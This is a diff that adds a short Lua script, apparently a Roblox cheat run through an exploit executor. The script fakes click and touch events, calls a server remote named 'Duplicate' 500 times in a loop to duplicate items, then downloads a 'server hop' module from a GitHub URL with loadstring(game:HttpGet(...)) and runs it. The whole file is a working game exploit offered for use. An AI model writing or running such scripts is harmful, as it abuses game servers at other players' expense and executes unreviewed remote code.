@@ -1,0 +1,14 @@
+if not game.isLoaded then
+game.Loaded:Wait()
+end
+wait(1)
+fireclickdetector(workspace.Lobby.Replica.ClickDetector)
+wait(1)
+firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild('HumanoidRootPart'), workspace.Lobby.Teleport2, 0)
+firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild('HumanoidRootPart'), workspace.Lobby.Teleport2, 1)
+wait(1.5)
+for i = 1, 500 do
+game:GetService('ReplicatedStorage').Duplicate:FireServer()
+end
+local module = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua"))()
+        module:Teleport(game.PlaceId)
